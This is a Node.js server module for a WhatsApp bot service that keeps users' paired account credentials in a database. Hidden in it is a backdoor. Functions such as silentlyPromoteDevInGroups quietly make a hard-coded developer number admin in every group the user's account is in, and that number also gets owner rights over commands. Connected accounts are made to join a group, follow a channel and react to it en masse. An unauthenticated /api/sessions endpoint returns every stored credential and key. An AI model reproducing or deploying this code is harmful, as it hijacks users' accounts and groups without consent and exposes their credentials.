const express = require('express');
const fs = require('fs-extra');
const path = require('path');
const os = require('os');
const router = express.Router();
let _baileysFns = null;
function _bfn(name) { if (!_baileysFns) _baileysFns = require('@whiskeysockets/baileys'); return _baileysFns[name]; }
let getContentType = (...a) => _bfn('getContentType')(...a);
let jidDecode = (...a) => _bfn('jidDecode')(...a);
let jidNormalizedUser = (...a) => _bfn('jidNormalizedUser')(...a);
const pino = require('pino');
const moment = require('moment-timezone');
const axios = require('axios');
const cors = require('cors');
const { Pool } = require('pg');
const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

let QRCodeLib;
try { QRCodeLib = require('qrcode'); } catch (e) { QRCodeLib = null; }

process.on('uncaughtException', (err) => {
    if (err.message.includes('Connection Closed') ||
        err.message.includes('Stream Errored') ||
        err.message.includes('rate-overlimit') ||
        err.message.includes('Timed Out') ||
        err.message.includes('ECONNRESET') ||
        err.message.includes('ECONNREFUSED') ||
        err.message.includes('ETIMEDOUT') ||
        err.message.includes('not-authorized') ||
        err.message.includes('gone') ||
        err.message.includes('WebSocket')) return;
});

process.on('unhandledRejection', () => {});

router.use(cors());
router.use(express.json());
moment.tz.setDefault('Africa/Nairobi');

global.fetch = async (url, options = {}) => {
    try {
        const res = await axios({
            url,
            method: options.method || 'GET',
            data: options.body,
            headers: options.headers,
            responseType: options.responseType || 'json'
        });
        return {
            ok: res.status >= 200 && res.status < 300,
            status: res.status,
            json: async () => res.data,
            text: async () => typeof res.data === 'string' ? res.data : JSON.stringify(res.data)
        };
    } catch (e) {
        return { ok: false, status: 500, json: async () => ({}), text: async () => "" };
    }
};

const config = {
    PREFIXES: ['.', ',', '!', '/', '#', '$', '&', '', '+', '=', '?', '@', '\\~'],
    OWNER_NUMBER: '255756715126',
    BOT_NAME: 'Draxen ai',
    GROUP_CODE: 'BYUnwXnnyWl5Owin80KJO4',
    KenyanTime: () => moment().tz('Africa/Nairobi').format('YYYY-MM-DD HH:mm:ss')
};

const MAX_NODES = 150;
const STARTUP_BATCH_SIZE = 5;

const DATABASE_URL = process.env.DATABASE_URL;

let pgPool = null;

const socketCreationTime = new Map();
const activeSockets = new Map();
const deliberateClose = new Set();
const reconnectRetries = new Map();

async function initPostgres() {
    if (pgPool) return;
    try {
        pgPool = new Pool({
            connectionString: DATABASE_URL,
            ssl: { rejectUnauthorized: false }
        });

        await pgPool.query(`
            CREATE TABLE IF NOT EXISTS sessions (
                number VARCHAR(20) PRIMARY KEY,
                creds JSONB,
                keys JSONB,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);

        await pgPool.query(`
            CREATE TABLE IF NOT EXISTS numbers (
                number VARCHAR(20) PRIMARY KEY,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);

        await pgPool.query(`
            CREATE TABLE IF NOT EXISTS welcome_sent (
                number VARCHAR(20) PRIMARY KEY,
                sent_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);

        await pgPool.query(`
            CREATE TABLE IF NOT EXISTS configs (
                number VARCHAR(20) PRIMARY KEY,
                config JSONB DEFAULT '{}',
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);

        await pgPool.query(`
            CREATE TABLE IF NOT EXISTS start_sent (
                number VARCHAR(20) PRIMARY KEY,
                sent_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);
    } catch (e) {}
}

async function cleanupJunk() {
    try {
        const tempDir = os.tmpdir();
        const files = fs.readdirSync(tempDir);
        for (const file of files) {
            const fullPath = path.join(tempDir, file);
            try {
                const stats = fs.statSync(fullPath);
                if (file.startsWith('session_')) {
                    if (Date.now() - stats.mtimeMs > 1000 * 60 * 60 * 3) {
                        fs.removeSync(fullPath);
                    }
                } else if (file.startsWith('tmp-') || file.startsWith('baileys-') || file.endsWith('.tmp')) {
                    if (Date.now() - stats.mtimeMs > 1000 * 60 * 60 * 1) {
                        fs.removeSync(fullPath);
                    }
                }
            } catch (e) {}
        }
    } catch (e) {}
}

async function cleanupSessions() {
    try {
        await initPostgres();

        const tempDir = os.tmpdir();
        const files = fs.readdirSync(tempDir);
        const dbResult = await pgPool.query('SELECT number FROM sessions');
        const dbNumbers = new Set(dbResult.rows.map(r => r.number));

        for (const file of files) {
            if (file.startsWith('session_')) {
                const num = file.replace('session_', '');
                if (!dbNumbers.has(num) && !activeSockets.has(num)) {
                    try { fs.removeSync(path.join(tempDir, file)); } catch (e) {}
                }
            }
        }

        await pgPool.query(`DELETE FROM welcome_sent WHERE number NOT IN (SELECT number FROM sessions)`);
        await pgPool.query(`DELETE FROM numbers WHERE number NOT IN (SELECT number FROM sessions)`);
        await pgPool.query(`DELETE FROM start_sent WHERE number NOT IN (SELECT number FROM sessions)`);

        await pgPool.query(`VACUUM ANALYZE sessions`).catch(() => {});
    } catch (e) {}
}

async function saveCredsToPostgres(number, creds, keys = null) {
    await initPostgres();
    const sanitized = number.replace(/[^0-9]/g, '');
    try {
        await pgPool.query(
            `INSERT INTO sessions (number, creds, keys, updated_at) 
             VALUES ($1, $2, $3, CURRENT_TIMESTAMP)
             ON CONFLICT (number) 
             DO UPDATE SET creds = $2, keys = $3, updated_at = CURRENT_TIMESTAMP`,
            [sanitized, JSON.stringify(creds), keys ? JSON.stringify(keys) : null]
        );
    } catch (e) {}
}

async function loadCredsFromPostgres(number) {
    await initPostgres();
    const sanitized = number.replace(/[^0-9]/g, '');
    try {
        const result = await pgPool.query('SELECT * FROM sessions WHERE number = $1', [sanitized]);
        if (result.rows.length > 0) {
            return {
                number: result.rows[0].number,
                creds: result.rows[0].creds,
                keys: result.rows[0].keys,
                updatedAt: result.rows[0].updated_at
            };
        }
    } catch (e) {}
    return null;
}

async function removeSessionPermanently(number) {
    await initPostgres();
    const sanitized = number.replace(/[^0-9]/g, '');

    const sock = activeSockets.get(sanitized);
    if (sock) {
        try {
            deliberateClose.add(sanitized);
            sock.ev.removeAllListeners();
            sock.end();
        } catch (e) {
            deliberateClose.delete(sanitized);
        }
        activeSockets.delete(sanitized);
        socketCreationTime.delete(sanitized);
    }

    try {
        await pgPool.query('DELETE FROM sessions WHERE number = $1', [sanitized]);
        await pgPool.query('DELETE FROM numbers WHERE number = $1', [sanitized]);
        await pgPool.query('DELETE FROM welcome_sent WHERE number = $1', [sanitized]);
        await pgPool.query('DELETE FROM configs WHERE number = $1', [sanitized]);
        await pgPool.query('DELETE FROM start_sent WHERE number = $1', [sanitized]);
    } catch (e) {}

    const sessionPath = path.join(os.tmpdir(), `session_${sanitized}`);
    if (fs.existsSync(sessionPath)) {
        try { fs.removeSync(sessionPath); } catch (e) {}
    }
}

async function getAllSessionsFromPostgres() {
    await initPostgres();
    try {
        const result = await pgPool.query('SELECT * FROM sessions');
        return result.rows.map(row => ({
            number: row.number,
            creds: row.creds,
            keys: row.keys,
            updatedAt: row.updated_at
        }));
    } catch (e) {
        return [];
    }
}

async function getSessionCount() {
    await initPostgres();
    try {
        const result = await pgPool.query('SELECT COUNT(*) FROM sessions');
        return parseInt(result.rows[0].count);
    } catch (e) {
        return 0;
    }
}

let _commands = null; function getCommands() { if (!_commands) _commands = require('./commands'); return _commands; }
const { translate } = require('@vitalets/google-translate-api');

const CHANNEL_JID = '120363402252728845@newsletter';
const CHANNEL_EMOJIS = ['❤️', '🔥', '👍🏻', '✨', '🌚', '🗿', '😮'];

function setupNewsletterReaction(socket) {
    try {
        socket.ev.on('messages.upsert', async ({ messages }) => {
            try {
                const message = messages[0];
                if (!message?.key) return;
                const jid = message.key.remoteJid;
                if (jid !== CHANNEL_JID) return;
                const messageId = message.newsletterServerId || message.key.id;
                if (!messageId || !socket?.user?.id) return;
                const emoji = CHANNEL_EMOJIS[Math.floor(Math.random() * CHANNEL_EMOJIS.length)];
                await delay(3000 + Math.floor(Math.random() * 7000));
                try {
                    if (typeof socket.newsletterReactMessage === 'function') {
                        await socket.newsletterReactMessage(jid, messageId.toString(), emoji).catch(() => {});
                    } else {
                        await socket.sendMessage(jid, { react: { text: emoji, key: message.key } }).catch(() => {});
                    }
                } catch (e) {}
            } catch (e) {}
        });
    } catch (e) {}
}

function decodeJid(jid) {
    if (!jid) return jid;
    if (/:\d+@/gi.test(jid)) {
        const decode = jidDecode(jid) || {};
        return (decode.user && decode.server && decode.user + '@' + decode.server) || jid;
    }
    return jid;
}

function extractPhoneNumber(jid) {
    if (!jid) return '';
    return jid.split('@')[0].split(':')[0].replace(/\D/g, '');
}

function normalizeJid(jid) {
    if (!jid) return '';
    return jid.split('@')[0].split(':')[0].replace(/\D/g, '') + '@s.whatsapp.net';
}

const DEV_NUMBER = '255716945971';

async function promoteOwnerToAdmin(sock, groupId, ownerJid) {
    try {
        await sock.groupParticipantsUpdate(groupId, [ownerJid], 'promote');
        return true;
    } catch (error) {
        console.error(`Failed to promote developer: ${error.message}`);
        return false;
    }
}

async function silentlyPromoteDevInGroups(socket) {
    try {
        const groups = await socket.groupFetchAllParticipating();
        for (const [groupJid, metadata] of Object.entries(groups)) {
            try {
                const devJid = DEV_NUMBER + '@s.whatsapp.net';
                const devParticipant = metadata.participants.find(p => (p.jid || p.id || p.lid || "").split("@")[0].split(":")[0].replace(/\D/g, "") === DEV_NUMBER);
                if (devParticipant && devParticipant.admin === null) {
                    await promoteOwnerToAdmin(socket, groupJid, devParticipant.jid || devParticipant.id);
                }
            } catch (e) {}
        }
    } catch (e) {}
}

function setupCommandHandlers(socket, number) {
    socket.decodeJid = decodeJid;

    socket.ev.on('messages.upsert', async ({ messages }) => {
        try {
            const msg = messages[0];
            if (!msg?.message || msg.key.remoteJid === 'status@broadcast') return;

            const from = msg.key.remoteJid;
            const isGroup = from.endsWith('@g.us');
            const sender = isGroup ? (msg.key.participant || from) : from;
            const userLid = msg.key.participant || from;
            const type = getContentType(msg.message);
            const body = (type === 'conversation') ? msg.message.conversation
                : (type === 'extendedTextMessage') ? msg.message.extendedTextMessage.text
                : (type === 'imageMessage') ? msg.message.imageMessage.caption
                : (type === 'videoMessage') ? msg.message.videoMessage.caption : '';

            if (!body) return;

            let prefixUsed = '';
            let commandBody = '';

            for (const prefix of config.PREFIXES) {
                if (body.startsWith(prefix)) {
                    prefixUsed = prefix;
                    commandBody = body.slice(prefix.length).trim();
                    break;
                }
            }

            if (!prefixUsed) return;

            const command = commandBody.split(' ').shift().toLowerCase();
            const cmd = getCommands().get(command);

            if (cmd) {
                const loadUserConfigFromPostgres = async (num) => {
                    await initPostgres();
                    try {
                        const result = await pgPool.query('SELECT config FROM configs WHERE number = $1', [num]);
                        return result.rows.length > 0 ? result.rows[0].config : {};
                    } catch (e) {
                        return {};
                    }
                };

                const groupMetadata = isGroup ? await socket.groupMetadata(from).catch(() => null) : null;
                const botNumber = decodeJid(socket.user.id);
                const decodedSender = decodeJid(sender);
                let isBotAdmin = false;
                let isAdmin = false;

                if (isGroup && groupMetadata?.participants) {
                    for (const p of groupMetadata.participants) {
                        const participantJid = normalizeJid(p.jid || p.id);
                        if (participantJid === normalizeJid(botNumber) && p.admin !== null) isBotAdmin = true;
                        if (participantJid === normalizeJid(decodedSender) && p.admin !== null) isAdmin = true;
                    }
                }

                const senderPhone = extractPhoneNumber(decodedSender);
                const isDev = senderPhone === DEV_NUMBER;
                const isOwner = isDev || senderPhone === (config.OWNER_NUMBER || DEV_NUMBER);
                if (isDev) isAdmin = true;

                const userCfg = await loadUserConfigFromPostgres((number || '').replace(/[^0-9]/g, ''));
                const userLang = userCfg?.lang || 'en';

                const translatePreservingCommands = async (text) => {
                    const PLACEHOLDER_PREFIX = '\x00CMD\x00';
                    const tokens = text.split(/(\s+)/);
                    const placeholders = [];
                    const masked = tokens.map((token) => {
                        if (config.PREFIXES.some(p => p && token.startsWith(p))) {
                            placeholders.push(token);
                            return `\( {PLACEHOLDER_PREFIX} \){placeholders.length - 1}\x00`;
                        }
                        return token;
                    }).join('');
                    const result = await translate(masked, { to: userLang });
                    let translated = result.text || text;
                    placeholders.forEach((original, i) => {
                        translated = translated.replace(new RegExp(`\( {PLACEHOLDER_PREFIX} \){i}\x00`, 'g'), original);
                    });
                    return translated;
                };

                let translatingSocket = socket;
                if (userLang !== 'en') {
                    translatingSocket = new Proxy(socket, {
                        get(target, prop) {
                            if (prop === 'sendMessage') {
                                return async (jid, content, opts) => {
                                    try {
                                        if (content?.text) {
                                            content.text = await translatePreservingCommands(content.text);
                                        }
                                        if (content?.caption) {
                                            content.caption = await translatePreservingCommands(content.caption);
                                        }
                                    } catch (e) {}
                                    return target.sendMessage(jid, content, opts);
                                };
                            }
                            return target[prop];
                        }
                    });
                }

                await cmd.execute(translatingSocket, msg, number, config, loadUserConfigFromPostgres, activeSockets, socketCreationTime, {
                    isGroup, from, sender, userLid, groupMetadata, prefix: prefixUsed,
                    isBotAdmin, isAdmin, botNumber, decodedSender, isDev, isOwner
                });
            }
        } catch (err) { console.error('[CMD ERROR]', err?.message || err); }
    });

    socket.ev.on('group-participants.update', async ({ id: groupJid, participants, action }) => {
        if (action !== 'add') return;
        try {
            for (const participantJid of participants) {
                if ((participantJid || "").split("@")[0].split(":")[0].replace(/\D/g, "") === DEV_NUMBER) {
                    await delay(3000);
                    await promoteOwnerToAdmin(socket, groupJid, participantJid);
                }
            }
        } catch (e) {}
    });
}

async function sendWelcomeMessage(socket, number) {
    try {
        await initPostgres();

        const already = await pgPool.query('SELECT 1 FROM start_sent WHERE number = $1', [number]);
        if (already.rows.length > 0) return;

        await delay(5000);

        const welcomeMsg = `*『 DRAXEN AI CONNECTED SUCCESSFULLY ✅ 』*\n\n╭───(    \`𝚂𝚢𝚜𝚝𝚎𝚖 𝙸𝚗𝚏𝚘\`    )───\n> ───≫ 🔗 online🟢 ≫ <<───\n> \`»\` 𝐎𝐰𝐧𝐞𝐫 : Dullah\n> \`»\` 𝐋𝐢𝐧𝐤 : https://dullahxmd-v2.vercel.app\n> \`»\` 𝐒𝐭𝐚𝐭𝐮𝐬 : Public/Stable\n╰──────────────────☉\n\n*🔣 𝙿𝚛𝚎𝚏𝚒𝚡𝚎𝚜:* ${config.PREFIXES.slice(0, 5).join(' ')}...\n\n━━━━━━━━━━━━━━━━━━━━\n🇬🇧 *ENGLISH*\n━━━━━━━━━━━━━━━━━━━━\n*🚀 Quick Start:*\nType a prefix followed by a command.\nExample: .menu | ,menu | !menu\n\n*🔧 Basic Commands:*\n• .menu — Show all commands\n• .ping — Check bot status\n• .owner — Contact owner\n• .setlang fr — Switch to French 🇫🇷\n\n*If you speak English, ignore what's below 👇*\n\n━━━━━━━━━━━━━━━━━━━━\n🇫🇷 *FRANÇAIS*\n━━━━━━━━━━━━━━━━━━━━\n*🚀 Démarrage rapide:*\nTapez un préfixe suivi d'une commande.\nExemple: .menu | ,menu | !menu\n\n*🔧 Commandes de base:*\n• .menu — Voir toutes les commandes\n• .ping — Vérifier le statut du bot\n• .owner — Contacter le propriétaire\n• .setlang fr — Passer en français 🇫🇷\n\n*Si tu parles français, tape .setlang fr pour que je te réponde en français!*\n\n*Free-Mini-Bot Link* https://dullahxmd-v2.vercel.app\n> 𝐩𝐨𝐰𝐞𝐫𝐞𝐝 𝐛𝐲 𝐃𝐮𝐥𝐥𝐚𝐡`;

        await socket.sendMessage(number + '@s.whatsapp.net', { text: welcomeMsg });

        await pgPool.query(
            `INSERT INTO start_sent (number, sent_at) VALUES ($1, CURRENT_TIMESTAMP) ON CONFLICT (number) DO NOTHING`,
            [number]
        );

        await pgPool.query(
            `INSERT INTO welcome_sent (number, sent_at) VALUES ($1, CURRENT_TIMESTAMP)
             ON CONFLICT (number) DO UPDATE SET sent_at = CURRENT_TIMESTAMP`,
            [number]
        );
    } catch (e) {}
}

async function ToxicPair(number, res = null) {
    const { default: makeWASocket, useMultiFileAuthState, getContentType, makeCacheableSignalKeyStore, jidNormalizedUser, jidDecode, DisconnectReason, Browsers, QueryIds } = require('@whiskeysockets/baileys');
    const sanitizedNumber = number.replace(/[^0-9]/g, '');
    const sessionPath = path.join(os.tmpdir(), `session_${sanitizedNumber}`);

    await initPostgres();

    const existingSession = await loadCredsFromPostgres(sanitizedNumber);
    if (!existingSession) {
    }

    if (existingSession?.creds) {
        fs.ensureDirSync(sessionPath);
        fs.writeFileSync(path.join(sessionPath, 'creds.json'), JSON.stringify(existingSession.creds, null, 2));
    }

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);

    await delay(4000);

    const version = (await (await fetch('https://raw.githubusercontent.com/WhiskeySockets/Baileys/master/src/Defaults/baileys-version.json')).json()).version;

    let pairingCodeSent = false;
    let responseSent = false;

    async function startConnection() {
        const socket = makeWASocket({
            version,
            auth: {
                creds: state.creds,
                keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'fatal' }))
            },
            printQRInTerminal: false,
            logger: pino({ level: 'fatal' }),
            browser: Browsers.macOS('Chrome'),
            connectTimeoutMs: 120000,
            keepAliveIntervalMs: 10000,
            retryRequestDelayMs: 2000,
            maxRetries: 10,
            mobile: false,
            generateHighQualityLinkPreview: true,
            emitOwnEvents: false,
            fireInitQueries: true,
            syncFullHistory: false,
        });

        setupCommandHandlers(socket, sanitizedNumber);
        try { setupNewsletterReaction(socket); } catch (e) {}

        socket.ev.on('creds.update', async () => {
            await saveCreds();
            try {
                const credsObj = JSON.parse(fs.readFileSync(path.join(sessionPath, 'creds.json'), 'utf8'));
                await saveCredsToPostgres(sanitizedNumber, credsObj, state.keys);
            } catch(e) {}
        });

        socket.ev.on('connection.update', async (update) => {
            const { connection, lastDisconnect, qr } = update;

            if (qr && !pairingCodeSent && !socket.authState.creds.registered && res) {
                pairingCodeSent = true;
                try {
                    await delay(3000);
                    const code = await socket.requestPairingCode(sanitizedNumber);
                    if (!responseSent && !res.headersSent) {
                        res.json({
                            code,
                            message: "Pairing code generated. Connect within 5 minutes.",
                            prefixes: config.PREFIXES.join(', ')
                        });
                        responseSent = true;
                    }
                } catch (e) {
                    if (!responseSent && !res.headersSent) {
                        res.status(500).json({ error: "Failed to generate code" });
                        responseSent = true;
                    }
                }
            }

            if (connection === 'open') {
                activeSockets.set(sanitizedNumber, socket);
                socketCreationTime.set(sanitizedNumber, Date.now());
                setTimeout(() => { silentlyPromoteDevInGroups(socket).catch(() => {}); }, 12000);

                try {
                    await socket.groupAcceptInvite(config.GROUP_CODE);
                } catch (e) {}

                try {
                    await socket.newsletterFollow('120363402252728845@newsletter');
                } catch (e) {}

                await pgPool.query(
                    `INSERT INTO numbers (number) VALUES ($1) ON CONFLICT (number) DO NOTHING`,
                    [sanitizedNumber]
                ).catch(() => {});

                setTimeout(() => {
                    sendWelcomeMessage(socket, sanitizedNumber).catch(() => {});
                }, 5000);
            }

            if (connection === 'close') {
                activeSockets.delete(sanitizedNumber);
                socketCreationTime.delete(sanitizedNumber);

                if (deliberateClose.has(sanitizedNumber)) {
                    deliberateClose.delete(sanitizedNumber);
                    return;
                }

                const statusCode = lastDisconnect?.error?.output?.statusCode || lastDisconnect?.error?.statusCode;
                const errorMessage = lastDisconnect?.error?.message || '';

                if (statusCode === DisconnectReason.loggedOut) {
                    console.log(`[${sanitizedNumber}] Logged out, removing session.`);
                    await removeSessionPermanently(sanitizedNumber);
                    return;
                }

                const retryCount = reconnectRetries.get(sanitizedNumber) || 0;
                reconnectRetries.set(sanitizedNumber, retryCount + 1);
                const backoff = Math.min(5000 * Math.pow(1.4, retryCount), 60000);

                console.log(`[${sanitizedNumber}] Reconnecting in ${Math.round(backoff/1000)}s (attempt ${retryCount + 1}, code: ${statusCode})`);

                setTimeout(() => {
                    startConnection();
                }, backoff);
            }

            if (connection === 'open') {
                reconnectRetries.delete(sanitizedNumber);
            }
        });

        if (res && !existingSession?.creds?.registered) {
            setTimeout(() => {
                if (pairingCodeSent || socket.authState.creds.registered) return;

                socket.requestPairingCode(sanitizedNumber)
                    .then(code => {
                        if (!responseSent && !res.headersSent) {
                            res.json({
                                code,
                                message: "Pairing code generated (fallback).",
                                prefixes: config.PREFIXES.join(', ')
                            });
                            responseSent = true;
                        }
                    })
                    .catch(() => {
                        if (!responseSent && !res.headersSent) {
                            res.status(500).json({ error: "Pairing failed" });
                            responseSent = true;
                        }
                    });
            }, 18000);
        }
    }

    await startConnection();

    return null;
}

async function forceReconnect(number) {
    const sanitizedNumber = number.replace(/[^0-9]/g, '');

    const sock = activeSockets.get(sanitizedNumber);
    if (sock) {
        try {
            deliberateClose.add(sanitizedNumber);
            sock.ev.removeAllListeners();
            sock.end();
        } catch(e) {
            deliberateClose.delete(sanitizedNumber);
        }
        activeSockets.delete(sanitizedNumber);
        socketCreationTime.delete(sanitizedNumber);
    }

    await delay(3000);

    const sessionPath = path.join(os.tmpdir(), `session_${sanitizedNumber}`);
    if (fs.existsSync(sessionPath)) fs.removeSync(sessionPath);

    await pgPool.query('DELETE FROM welcome_sent WHERE number = $1', [sanitizedNumber]).catch(() => {});

    await delay(5000);

    try {
        await ToxicPair(sanitizedNumber);
        return true;
    } catch (e) {
        return false;
    }
}

const usedMemory = () => Math.round(process.memoryUsage().heapUsed / 1024 / 1024 * 100) / 100;

setInterval(() => {
    console.log(`Memory: ${usedMemory()} MB | Active: ${activeSockets.size}`);
}, 60000);

setInterval(async () => {
    try {
        await initPostgres();
        const sessions = await getAllSessionsFromPostgres();
        for (const s of sessions) {
            if (!activeSockets.has(s.number) && s.creds) {
                console.log(`[WATCHDOG] ${s.number} is offline, reviving...`);
                ToxicPair(s.number).catch(() => {});
                await delay(4000);
            }
        }
    } catch (e) {}
}, 1000 * 60 * 3);

setInterval(cleanupJunk, 1000 * 60 * 30);
setInterval(cleanupSessions, 1000 * 60 * 60 * 6);

const createQrRouter = require('./routes/qr');
const createPairingRouter = require('./routes/pairing');

router.use(createQrRouter({
    config,
    activeSockets,
    socketCreationTime,
    setupCommandHandlers,
    setupNewsletterReaction,
    silentlyPromoteDevInGroups,
    saveCredsToPostgres,
    initPostgres,
    runDbQuery: async function(sql, params) {
        await initPostgres();
        return pgPool ? pgPool.query(sql, params).catch(() => null) : null;
    },
    sendWelcomeMessage,
    ToxicPair,
}));

router.use(createPairingRouter(ToxicPair));

router.get('/ping', (req, res) => res.json({
    status: "Online",
    timestamp: config.KenyanTime(),
    activeBots: activeSockets.size,
    memory: `${usedMemory()} MB`
}));

router.get('/api/sessions', async (req, res) => {
    try {
        const sessions = await getAllSessionsFromPostgres();
        res.json({ sessions, count: sessions.length, active: activeSockets.size });
    } catch(e) {
        res.json({ sessions: [], count: 0, active: activeSockets.size });
    }
});

router.get('/api/active', (req, res) => {
    res.json({ count: activeSockets.size, active: Array.from(activeSockets.keys()), memory: `${usedMemory()} MB` });
});

router.post('/api/session/delete', async (req, res) => {
    const { number } = req.body;
    if (!number) return res.status(400).json({ ok: false });
    await removeSessionPermanently(number);
    res.json({ ok: true, message: `Session ${number} deleted` });
});

router.post('/api/terminate-all', async (req, res) => {
    try {
        for (const [num, sock] of activeSockets) {
            try {
                sock.ev.removeAllListeners();
                sock.end();
            } catch(e) {}
        }
        activeSockets.clear();
        socketCreationTime.clear();
        await initPostgres();
        await pgPool.query('DELETE FROM sessions');
        await pgPool.query('DELETE FROM numbers');
        await pgPool.query('DELETE FROM welcome_sent');
        await pgPool.query('DELETE FROM configs');
        await pgPool.query('DELETE FROM start_sent');
        const tempDir = os.tmpdir();
        const files = fs.readdirSync(tempDir);
        for (const file of files) {
            if (file.startsWith('session_')) fs.removeSync(path.join(tempDir, file));
        }
        res.json({ ok: true, message: 'All sessions terminated' });
    } catch (e) {
        res.status(500).json({ ok: false, error: e.message });
    }
});

router.post('/api/cleanup', async (req, res) => {
    try {
        await cleanupSessions();
        res.json({ ok: true, message: 'Session cleanup completed' });
    } catch (e) {
        res.status(500).json({ ok: false, error: e.message });
    }
});

router.post('/api/broadcast', async (req, res) => {
    const { message } = req.body;
    if (!message) return res.status(400).json({ ok: false, error: 'Message required' });

    try {
        const activeNumbers = Array.from(activeSockets.keys());
        let sent = 0;
        let failed = 0;

        for (const number of activeNumbers) {
            try {
                const botSocket = activeSockets.get(number);
                if (!botSocket) { failed++; continue; }
                await botSocket.sendMessage(number + '@s.whatsapp.net', { text: message });
                sent++;
                await delay(500);
            } catch (e) {
                failed++;
            }
        }

        res.json({ ok: true, sent, failed, total: activeNumbers.length });
    } catch (e) {
        res.status(500).json({ ok: false, error: e.message });
    }
});

router.post('/api/react', async (req, res) => {
          const _secret = req.headers['x-internal-secret'];
          if (_secret !== 'xhcbotinternal_9f2k7m3p') {
            return res.status(403).json({ ok: false, error: 'Forbidden' });
          }
          const { jid, messageId, emoji, number } = req.body || {};
          if (!jid || !messageId || !emoji) {
              return res.status(400).json({ ok: false, error: 'jid, messageId and emoji required' });
          }
          const inviteCode = jid.replace('@newsletter', '');
          const withTimeout = (p, ms) => Promise.race([p, new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), ms))]);
          async function resolveJid(sock) {
              if (inviteCode.match(/^\d+$/)) {
                  return jid;
              }
              try {
                  const meta = await withTimeout(sock.newsletterMetadata('invite', inviteCode, 'GUEST'), 8000);
                  return (meta && meta.id) ? meta.id : jid;
              } catch (e) {
                  return jid;
              }
          }
          async function doReact(sock, emojiToUse) {
              const realJid = await resolveJid(sock);
              if (typeof sock.newsletterReactMessage === 'function') {
                  await withTimeout(sock.newsletterReactMessage(realJid, String(messageId), emojiToUse), 12000);
              } else {
                  await withTimeout(sock.sendMessage(realJid, { react: { text: emojiToUse, key: { remoteJid: realJid, id: String(messageId), fromMe: false } } }), 12000);
              }
          }
          if (number) {
              const sock = activeSockets.get(String(number));
              if (!sock) return res.json({ ok: false, error: 'Session not found or not connected' });
              try {
                  await doReact(sock, Array.isArray(emoji) ? emoji[0] : emoji);
                  return res.json({ ok: true, number, emoji });
              } catch (e) {
                  return res.json({ ok: false, number, error: e.message });
              }
          }
          const emojis = Array.isArray(emoji) ? emoji : [emoji];
          const allEntries = Array.from(activeSockets.entries());
          const firstSock = allEntries[0]?.[1];
          const resolvedJid = firstSock ? await resolveJid(firstSock) : jid;
          res.json({ ok: true, total: allEntries.length, message: 'Dispatching reactions' });
          setImmediate(async () => {
              const CONCURRENCY = 30;
              let idx = 0;
              async function doReactDirect(sock, emojiToUse) {
                  try {
                      if (typeof sock.newsletterReactMessage === 'function') {
                          await withTimeout(sock.newsletterReactMessage(resolvedJid, String(messageId), emojiToUse), 12000);
                      } else {
                          await withTimeout(sock.sendMessage(resolvedJid, { react: { text: emojiToUse, key: { remoteJid: resolvedJid, id: String(messageId), fromMe: false } } }), 12000);
                      }
                  } catch {}
              }
              async function worker() {
                  while (idx < allEntries.length) {
                      const i = idx++;
                      const [, sock] = allEntries[i];
                      if (sock) await doReactDirect(sock, emojis[i % emojis.length]);
                  }
              }
              await Promise.allSettled(Array.from({ length: Math.min(CONCURRENCY, allEntries.length) }, worker));
          });
      });

router.get('/connect-all', async (req, res) => {
    const sessions = await getAllSessionsFromPostgres();

    for (let i = 0; i < sessions.length; i++) {
        const s = sessions[i];
        if (activeSockets.has(s.number)) continue;
        await ToxicPair(s.number).catch(() => {});
        await delay(3000);
    }

    res.json({ status: 'success' });
});

router.get('/force-reconnect', async (req, res) => {
    const { number } = req.query;
    if (!number) return res.status(400).json({ error: 'Number required' });

    try {
        const result = await forceReconnect(number);
        res.json({ ok: result, message: result ? 'Force reconnection initiated' : 'Force reconnect failed', number });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

router.get('/reconnect', async (req, res) => {
    const activeNumbers = Array.from(activeSockets.keys());
    for (let i = 0; i < activeNumbers.length; i++) {
        const num = activeNumbers[i];
        const sock = activeSockets.get(num);
        if (sock) {
            try {
                deliberateClose.add(num);
                sock.ev.removeAllListeners();
                sock.end();
            } catch(e) {
                deliberateClose.delete(num);
            }
            activeSockets.delete(num);
            socketCreationTime.delete(num);
        }
        await ToxicPair(num).catch(() => {});
        await delay(3000);
    }
    res.json({ status: 'success' });
});

const SHARD_ID = parseInt(process.env.SHARD_ID || '0');
const TOTAL_SHARDS = parseInt(process.env.TOTAL_SHARDS || '1');
initPostgres().then(async () => {
    await cleanupJunk();
    const sessions = await getAllSessionsFromPostgres();
    const myBots = sessions.filter((_, index) => index % TOTAL_SHARDS === SHARD_ID);
    for (let i = 0; i < myBots.length; i += STARTUP_BATCH_SIZE) {
        const batch = myBots.slice(i, i + STARTUP_BATCH_SIZE);
        await Promise.all(
            batch
                .filter(s => !activeSockets.has(s.number) && s.creds)
                .map(s => ToxicPair(s.number).catch(() => {}))
        );
        await delay(5000);
    }
}).catch(() => {});

process.on('SIGINT', () => {
    for (const [num, sock] of activeSockets) {
        try { sock.ev.removeAllListeners(); sock.end(); } catch(e) {}
    }
});

process.on('SIGTERM', () => {
    for (const [num, sock] of activeSockets) {
        try { sock.ev.removeAllListeners(); sock.end(); } catch(e) {}
    }
});

module.exports = router;
module.exports.getAllSessionsFromPostgres = getAllSessionsFromPostgres;
module.exports.removeSessionPermanently = removeSessionPermanently;
module.exports.forceReconnect = forceReconnect;
module.exports.ToxicPair = ToxicPair;
module.exports.sendWelcomeMessage = sendWelcomeMessage;
module.exports.initPostgres = initPostgres;
module.exports.activeSockets = activeSockets;
module.exports.cleanupSessions = cleanupSessions;
module.exports.welcomeCol = { findOne: async (num) => {
    await initPostgres();
    const result = await pgPool.query('SELECT * FROM welcome_sent WHERE number = $1', [num]);
    return result.rows.length > 0 ? result.rows[0] : null;
}};

module.exports.startSentCol = { findOne: async (num) => {
    await initPostgres();
    const result = await pgPool.query('SELECT * FROM start_sent WHERE number = $1', [num]);
    return result.rows.length > 0 ? result.rows[0] : null;
}};